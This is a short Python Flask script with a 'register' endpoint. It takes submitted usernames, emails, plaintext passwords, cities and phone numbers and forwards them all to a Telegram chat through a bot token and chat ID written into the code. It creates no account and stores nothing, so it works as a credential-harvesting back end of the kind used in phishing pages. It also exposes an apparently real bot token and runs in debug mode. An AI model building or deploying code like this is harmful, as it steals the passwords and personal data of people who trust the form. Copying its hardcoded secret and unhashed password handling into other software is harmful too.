from flask import Flask, request
import requests

app = Flask(__name__)

# Telegram Bot Token and Chat ID
token = '5124292647:AAFDcRg73eETpZGx9p9iBcDFD3cQmib4sps'
chat_id = '725411265'

@app.route('/register', methods=['POST'])
def register():
    username = request.form.get('username')
    email = request.form.get('email')
    password = request.form.get('password')
    city = request.form.get('city')
    phone = request.form.get('phone')

    message = f'New registration:\nUsername: {username}\nEmail: {email}\nPassword: {password}\nCity: {city}\nPhone: {phone}'
    send_to_telegram(message)
    return 'Data sent to Telegram', 200


def send_to_telegram(message):
    url = f'https://api.telegram.org/bot{token}/sendMessage'
    data = {
        'chat_id': chat_id,
        'text': message,
        'parse_mode': 'HTML'
    }
    requests.post(url, data=data)

if __name__ == '__main__':
    app.run(debug=True)